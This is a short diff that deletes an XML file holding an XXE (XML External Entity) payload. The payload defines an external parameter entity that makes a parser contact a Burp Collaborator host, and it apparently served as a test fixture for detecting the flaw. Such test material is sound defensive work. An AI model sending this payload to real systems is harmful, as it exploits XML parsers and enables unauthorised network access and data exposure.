@@ -1,6 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-    <!ENTITY % remote SYSTEM "http://bbq4lukd0sb52ctmdy5z0d79v01rpg.burpcollaborator.net">
-    %remote;]
->
-<root>%remote;</root>
